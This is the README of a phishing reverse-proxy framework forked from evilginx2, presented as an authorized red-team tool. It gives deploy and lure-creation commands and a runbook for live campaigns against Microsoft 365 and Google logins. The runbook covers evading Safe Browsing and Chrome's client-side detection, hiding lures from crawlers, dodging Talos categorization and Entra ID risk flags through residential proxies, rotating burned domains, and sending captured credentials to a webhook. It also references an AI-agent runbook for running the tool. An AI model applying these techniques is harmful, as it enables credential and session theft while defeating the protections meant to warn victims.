# fake-evilginx-pro

> 🌐 English | [Tiếng Việt](README.vi.md)

**A full-featured reverse-proxy phishing server for authorized red teams — an extended fork of [evilginx2 CE 3.3.0](https://github.com/kgretzky/evilginx2) (GPL-3.0), cleanly re-implementing Evilginx Pro features for internal/air-gapped environments.**

> ⚠️ **License & scope**: For education and red-team campaigns authorized by the system owner. Not affiliated with BreakDev/Evilginx Pro — no binaries or code from the commercial product are used; every feature is re-implemented from scratch based on the GPL source and public descriptions. Upstream GPL-3.0 applies (see `LICENSE`, credits to Kuba Gretzky).

**Deployment status** (details: [`deploy/README.md`](deploy/README.md), agent runbook: `.zcode/skills/deploying-and-operating-fake-evilginx-pro/SKILL.md`; hostnames/IPs/node names are kept in internal docs only — never published):

> ℹ️ Phishlet files (`src/phishlets/*.yaml`) are **gitignored by design** — the public repo never
> ships campaign phishlets; they are deployed directly onto the node. The table below tracks
> their development status only.

| Phishlet | Status | Applied features |
|----------|--------|------------------|
| `ms365` | ✅ **closed — production-ready** (field-verified) | work + consumer capture, mailbox reuse, token-gate, CSD hardening (SB bypass verified), JA4 allowlist |
| `google` | ⛔ **closed — platform limit documented** | CSD hardening ported, uTLS Chrome fingerprint, residential exit, credentials from real POST (`f.req`) — username capture verified. Google's server-side risk engine still rejects the lookup: its botguard is origin-bound (page origin ≠ accounts.google.com), independent of IP/TLS quality (tested: AWS, VN hosting, VNPT residential × Go/Chrome TLS — same rejection). See notes below |

---

## Features (parity with Evilginx Pro)

| # | Feature | Status | Usage |
|---|---------|--------|-------|
| 1 | **Client-Server fleet** | ✅ | mTLS REST API + `tools/egctl.py` drives multiple servers from one PC |
| 2 | **Hidden API + client certs** | ✅ | `-api <port>` — random stealth base path, auto-generated client cert |
| 3 | **Wildcard certs / no CT-log exposure** | ✅ (offline) | `tools/mint_internal_cert.sh` — internal CA, zero egress |
| 4 | **Botguard (anti-bot/scanner)** | ✅ | `-botguard` — TLS GREASE + headers + JS telemetry → decoy page |
| 5 | **Evilpuppet (browser telemetry)** | 🟡 code shipped | `puppet/` chromedp sidecar + API `/pp/cookies`; e2e pending chromium DNS fix (see `docs/EVILPUPPET.md`) |
| 6 | **Phishlet authoring kit** | ✅ | `tools/make_phishlet.py` + redirector templates |
| 7 | **DNS management** | ✅ (offline) | `tools/make_dns_zone.py` — local dnsmasq zone instead of the Cloudflare API |
| 8 | **Multi-domain** | ✅ | one domain per phishlet, cookies scoped to the phishlet domain |
| 9 | **JS obfuscation** | ✅ | `-jsobf off/low/medium/high/ultra` — string-array + rotation, a new variant per response |
| 10 | **rewrite_urls** | ✅ | `rewrite_urls: [{from, to, query_map, drop}]` — bidirectional path+query rewriting |
| 11 | **AES-256 lure params** | ✅ | default — server-side key, no more RC4-key-in-URL |
| 12 | **Gophish / credential webhook** | ✅ | `-webhook <internal URL>` — JSON + password_sha256 + campaign rid tracking |
| 13 | **Auto-deploy** | ✅ (offline) | `tools/deploy_offline.sh` — SSH deploy + systemd on internal hosts |
| 14 | **SQLite storage** | ✅ | replaces buntDB — modernc.org/sqlite pure-Go, WAL |
| 15 | **Lure token-gate** | ✅ | lures can carry a `token` (`"auto"` when created via API): a request missing `?t=<token>` gets a 302 to a benign URL — **Safe Browsing/crawlers never render the login page** to classify it, extending domain lifetime |
| 16 | **CSD hardening (anti client-side detection)** | ✅ verified | js_inject in the phishlet: (1) `input[type=password]` **never exists in the DOM** (swapped to `type=text` + `-webkit-text-security`, MutationObserver against re-renders, submit value unchanged) + (2) brand lazy-reveal (logo/brand hidden at load, restored on first gesture) — Chrome's CSPD/on-device AI has no features left to classify. **Field-verified 2026-09-11: SB-enabled Chrome, full flow, no Dangerous flag** |
| 17 | **Upstream proxy + per-target routing** | ✅ | SOCKS5/HTTP(S) proxy with auth for upstream traffic. **Per-target routes by domain suffix**: only listed domains go through the proxy (e.g. `google.com,gstatic.com,googleusercontent.com` → residential exit), everything else dials direct (e.g. MS365 keeps the node's own IP) — saves residential bandwidth and avoids Entra ID risk-flagging residential ASNs on work accounts. Managed via the `proxy` console command / API, hot-applied without restart, password masked in status |

Per-feature details + verification evidence: [`docs/FEATURES.md`](docs/FEATURES.md).

## Architecture

```
┌────────────── Operator PC (Windows) ──────────────────────────────────────┐
│  tools/egconsole.py (REPL: fleet API + lure token-gate + export + open    │
│  browser signed-in + tail SSH + puppet)  ·  tools/egctl.py  ·  session_launcher.py │
└───────────────┬──────────────────────────────────────────┬────────────────┘
                │ REST mTLS :9443 (stealth base path)      │ SSH
        ┌───────▼──────── SERVER NODE (internet-facing VPS) ▼──────────────┐
        │ evilginx2 (fake-evilginx-pro)                                    │
        │  :443  MITM reverse-proxy  ← wildcard cert *.<BASE>.<ZONE>       │
        │        (DNS-01, no per-host certs → nothing leaked to CT logs)   │
        │        botguard JA4 + UA + telemetry decoy · lure token-gate     │
        │  :9443 REST API mTLS (fleet + puppet push)                       │
        │  SQLite ~/.evilginx/data.db (sessions + cookies persist)         │
        │  puppet/ evilpuppet-lite (chromedp headless, auto-login + MFA)   │
        │  [optional] upstream residential proxy → config.json `proxy`     │
        └───────────────┬──────────────────────────────────────────────────┘
                        │ reverse-proxy (auto_filter + bidirectional sub_filters)
                        ▼
                 Real origins (login.microsoftonline.com / accounts.google.com …)
```

Anti-burn layers (keeping the domain off blocklists):

1. **Single wildcard DNS-01 cert** — CT logs only ever show `*.<BASE>.<ZONE>`; no hostnames to enumerate
2. **Lure token-gate** — crawlers/Safe Browsing hitting a lure without `?t=` only see a benign 302; the login page is never rendered for classification
3. **Botguard** — JA4 allowlist + UA blocklist + telemetry probe → scanners get the decoy
4. **Domain rotation** when flagged — re-run the new-domain runbook (~15 minutes, see the section above/below)

## Quickstart

### Build (no internet needed — vendored tree included)

```bash
cd src
go build -mod=vendor -o evilginx2 .          # main server
go build -mod=vendor -o evilpuppet-lite ./puppet   # sidecar (optional)
```

### Quick lab run (single machine, no real domain)

```bash
# 1) local DNS (lab .test domains)
echo "127.0.0.1 www.labphish.test"  | sudo tee -a /etc/hosts
echo "127.0.0.2 portal.labsvc.test" | sudo tee -a /etc/hosts

# 2) simulated origin (self-hosted test site)
python3 tools/lab/testsite.py &        # HTTPS login on 127.0.0.2:443 (self-signed cert)
python3 tools/lab/webhook_rx.py &      # receiver :9090 logs captured credentials

# 3) server with the full flag set
./evilginx2 -p ./phishlets -developer \
   -api 9443 -botguard -bg-ua=false -bg-grace 6 \
   -jsobf ultra -webhook http://127.0.0.1:9090/capture
```

Basic console commands (first run):

```
config domain labphish.test
config ipv4 external <IP> ; config ipv4 bind <IP>
phishlets hostname lab labphish.test
phishlets enable lab
lures create lab
lures get-url 0 victim=a@corp.local rid=cmp-1
```

### Drive it from your own PC (fleet)

```bash
cp tools/servers.example.json my-servers.json   # edit host/port/cert paths
python3 tools/egctl.py my-servers.json status
python3 tools/egctl.py my-servers.json phishlets
python3 tools/egctl.py my-servers.json enable lab
python3 tools/egctl.py my-servers.json lure-url lab 0 rid=cmp-1
python3 tools/egctl.py my-servers.json sessions
```

Client certs are generated by the server in `~/.evilginx/api/` (`ca.crt`, `client.crt`, `client.key`) — copy them to your PC and reference them in `my-servers.json`.

## New domain for campaigns (internet-facing VPS)

A domain flagged by Google Safe Browsing ("Dangerous" in Chrome) is **permanently poisoned**
in Google's system — review requests, new subdomains, or fresh certs will not lift the flag
while phishing content is hosted. The only real fix: **a new domain + wildcard DNS-01 from
day one + lure token-gates**. The whole procedure takes ~15 minutes.

### 1. Picking a domain

- Prefer domains **registered ≥1 year ago** (aged, clean history) — brand-new domains get
  crawled and scored more aggressively by Google
- Neutral SaaS/IT-portal style names that fit the lure context (`portal-*`, `*-cloud`,
  `myapps-*`…); **avoid** real bank/organization brands and obvious strings
  (`login-secure-…`) — they get reported faster
- Common TLDs (.com/.net/.org); any registrar, **WHOIS privacy not required**
- When the domain eventually gets flagged: register the next one and rotate using this
  exact procedure

### 2. Create the Cloudflare zone

1. Log in to [dash.cloudflare.com](https://dash.cloudflare.com) → **Add a domain** → enter
   the new domain → **Free** plan
2. Cloudflare issues **2 nameservers** (`xxx.ns.cloudflare.com`) — at your registrar, switch
   the domain's nameservers to these two
3. Wait for the zone to become **Active** (dashboard + email, usually 5–30 minutes)
4. Create exactly **one wildcard record** (DNS → Records → Add record):
   - Type `A` · Name `*.auth2` (i.e. `*.<BASE>`) · IPv4 `<VPS IP>` · **Proxy status: DNS only**
     (grey cloud — REQUIRED; orange-cloud proxying would terminate TLS in front of the VPS
     and break the flow)
   - **No** bare `@` record, no per-host records — wildcard only (minimizes CT/crawler surface)

### 3. Create the Cloudflare API token (DNS Edit permission)

1. Top-right avatar → **My Profile** → **API Tokens** → **Create Token**
2. Choose **Create Custom Token**:
   - **Permissions**: `Zone` → `DNS` → `Edit`
   - **Zone Resources**: `Include` → `Specific zone` → select the new domain
   - (recommended) **Client IP Filtering**: restrict to the VPS IP if static
   - Short TTL if it's a one-off
3. **Continue to summary → Create Token** — the token is shown **exactly once**, copy it now
4. Verify the token (on the VPS or locally):
   ```bash
   curl -s -H "Authorization: Bearer <TOKEN>" \
     https://api.cloudflare.com/client/v4/user/tokens/verify | jq .
   ```
   Expect `"status": "active"`. NEVER commit the token — pass it via env only.

### 4. Provision certs + enable the phishlet (on the VPS)

```bash
cd ~/fake-evilginx-pro/deploy        # on an existing node: the deploy dir already there
BASE=auth2 ZONE=<new-domain> CF_TOKEN='<token>' ./wildcard-cert-setup.sh
```

The script handles everything: issues the `*.<BASE>.<ZONE>` wildcard via DNS-01 → installs
it into `~/.evilginx/crt/sites/wildcard-<BASE>/` → **autocert OFF permanently** → sets the
phishlet hostname → renews via cron (auto-restart after renewal). The final line prints a
sample lure URL.

5. In the evilginx console (or `tools/egconsole.py` from your PC):
   ```
   phishlets hostname ms365 <BASE>.<ZONE>
   phishlets enable ms365
   ```
6. Create a **token-gated** lure via the API (`"token":"auto"` generates one):
   ```bash
   curl -sk --cert ~/.evilginx/api/client.crt --key ~/.evilginx/api/client.key \
     -X POST -H "Content-Type: application/json" \
     -d '{"phishlet":"ms365","path":"","redirect_url":"https://www.office.com","token":"auto"}' \
     "https://127.0.0.1:9443/api-<path>/lures"
   # → {"id":N,"path":"/XXXXXXXX","token":"<16-chars>"}
   ```
   **Campaign URL**: `https://<landing>.<BASE>.<ZONE>/XXXXXXXX?t=<token>`
   — without `?t=` (crawlers, Safe Browsing, link previews) the request only sees a 302 to
   the benign `redirect_url`, never the login page. Test both branches before sending:
   ```bash
   curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://<lure-url>"          # → 302 benign
   curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://<lure-url>?t=<token>" # → into the flow
   ```

### 5. Go-live checklist

- [ ] **Check for a pre-flag BEFORE pointing the domain at the server**: right after
      registration, open the domain (registrar parking page) in Chrome — if a
      "Dangerous" badge is already there, the domain was pre-flagged (prior abuse) →
      **drop it, pick another name**. Also avoid names containing famous brands: a brand in
      the name makes every classifier (client-side SB, SmartScreen, **Cisco Talos/Umbrella**,
      manual reports) score it as suspicious much faster.
- [ ] **Check the Talos/Umbrella category before use** (corporate SWG layer — NOT bypassable
      from infrastructure): open
      [talosintelligence.com/reputation](https://www.talosintelligence.com/reputation) →
      enter the domain → category must be benign (e.g. Business/Technology), NOT
      "Newly Seen/Registered", no threats. A freshly registered domain almost certainly trips
      NSD — age it first or buy a **clean aged domain** (aftermarket). The public Cisco
      dispute/recategorization form is ONLY for genuinely benign domains (decoys/redirectors),
      never for a domain actively running a phishlet.
- [ ] TLS handshake OK on the landing host (curl 200/302, Let's Encrypt wildcard cert)
- [ ] Lure without token → 302 benign; with token → into the login flow
- [ ] `config.json`: `autocert: false` — **never enable** on an internet-facing node
- [ ] Systemd unit has NO `-jsobf ultra`, NO `-debug`
- [ ] `-bg-trusted` includes operator/VPS IPs; `-bg-ja4 t13d15` for desktop Chrome
- [ ] Test with curl / Safe-Browsing-disabled browser — **never test lures in a real Chrome with SB**
      — proven 2026-09-11 (live node): Chrome's SB detects phishing **client-side**
      the moment it renders the password page (Microsoft UI on a foreign domain) and reports
      the URL to Google → that subdomain gets flagged within minutes even though no crawler
      ever hit the node. Disable SB in the test browser (chrome://settings/security).
      Exception: deliberate SB-on runs to VALIDATE CSD hardening — do them on the password
      host (sacrificial; rotating it is a one-line change)
- [ ] Multiple phishlets on one base: no duplicate `phish_sub` across enabled phishlets
- [ ] Google targets: residential upstream proxy in `config.json` (`proxy` section)

## Flag reference

| Flag | Default | Meaning |
|------|---------|---------|
| `-p DIR` | — | phishlets directory |
| `-developer` | off | self-signed certs for every hostname (no ACME — offline mode) |
| `-api PORT` | off | enable mTLS REST API (stealth path stored in `~/.evilginx/api/config.json`) |
| `-botguard` | off | enable Botguard (GREASE + headers + JS telemetry) |
| `-bg-grace N` | 8 | grace seconds before gating unverified sessions |
| `-bg-ua` | true | UA-blocklist layer (disable for puppet headless runs) |
| `-bg-ja4` | — | JA4 allowlist prefixes, comma separated (e.g. `t13d15,t12d`) |
| `-bg-trusted` | — | CIDRs skipping botguard scoring (operator/VPS internal IPs, e.g. `127.0.0.1/32,<VPS_IP>/32`) |
| `-bg-det-cidrs` | — | "detonator" CIDRs — sessions from these IPs are permanently decoyed |
| `-no-watch` | off | disable phishlet auto-reload |
| `-jsobf LVL` | off | obfuscate js_inject: off/low/medium/high/ultra |
| `-webhook URL` | off | push credential JSON when a session completes |
| `-c DIR` | `~/.evilginx` | config directory |

## Repository layout

```
fake-evilginx-pro/
├── README.md                # this file (EN) · README.vi.md (Vietnamese)
├── CHANGELOG.md             # history v0.1 → v0.9.1
├── LICENSE                  # GPL-3.0 (upstream)
├── src/                     # fork source (Go, vendored deps included)
│   ├── core/                # + lurecrypto, apid, botguard, rewrite, jsobf, webhook
│   ├── puppet/              # evilpuppet-lite sidecar (chromedp)
│   ├── database/            # SQLite layer
│   └── redirectors/         # templates (interstitial, download, ...)
├── tools/
│   ├── egconsole.py         # operator REPL console: fleet API + lures (token-gate) + export + open + SSH tail + puppet
│   ├── my-servers.example.json / my-servers.json  # fleet config for egconsole/egctl
│   ├── console.json         # SSH config for egconsole tail/puppet commands
│   ├── egctl.py             # multi-server fleet client
│   ├── make_phishlet.py     # phishlet generator + lint
│   ├── mint_internal_cert.sh# internal CA + cert
│   ├── deploy_offline.sh    # auto-deploy to internal hosts (systemd)
│   ├── make_dns_zone.py     # dnsmasq zone generator
│   ├── ja3.py               # JA3 calculator (tshark pipe)
│   ├── lab/                 # test site + webhook receiver + verifiers
│   └── patches/             # patch scripts to re-apply onto newer upstream
├── examples/phishlets/      # lab.yaml (rewrite_urls + js_inject samples), lab2.yaml
└── docs/                    # FEATURES, OFFLINE_OPS, BLUE_TEAM_IOC, EVILPUPPET, LAB_SETUP
```

## Documentation

- [`deploy/README.md`](deploy/README.md) — **live VPS node status + hardened unit + operating rules**
- `.zcode/skills/deploying-and-operating-fake-evilginx-pro/SKILL.md` — AI-agent runbook (proven gotchas + troubleshooting map)
- [`docs/FEATURES.md`](docs/FEATURES.md) — parity matrix + verification evidence
- [`docs/OFFLINE_OPS.md`](docs/OFFLINE_OPS.md) — zero-egress operation: audit, containment, checklist
- [`docs/EVILPUPPET.md`](docs/EVILPUPPET.md) — sidecar browser design + status
- [`docs/BLUE_TEAM_IOC.md`](docs/BLUE_TEAM_IOC.md) — defender's view (IOCs of this technology)
- [`docs/LAB_SETUP.md`](docs/LAB_SETUP.md) — rebuilding the lab end-to-end, step by step (with gotchas)

## Roadmap

- [x] ~~phishlet hot-reload~~ (v0.10: console/API/auto-watch — add/edit/remove phishlets without restart)
- [x] ~~JA4 for Botguard~~ (v0.10; h2 Akamai fingerprint remaining)
- [x] ~~lure writer-API edit/delete~~ (apid.go: GET/PUT/DELETE `/lures/{id}`)
- [x] ~~lure token-gate against Safe Browsing~~ (X-Eg-Gate benign redirect, 2026-09-10)
- [x] ~~CSD hardening against client-side detection~~ (2026-09-11, **field-verified: SB on, no flag**)
- [ ] evilpuppet e2e (chromium DNS fix via local dnsmasq zone)
- [ ] JA4 + HTTP/2 Akamai fingerprint for Botguard
- [ ] Google phishlet completion (waiting on residential upstream proxy — Google blocks sign-in from datacenter IPs)
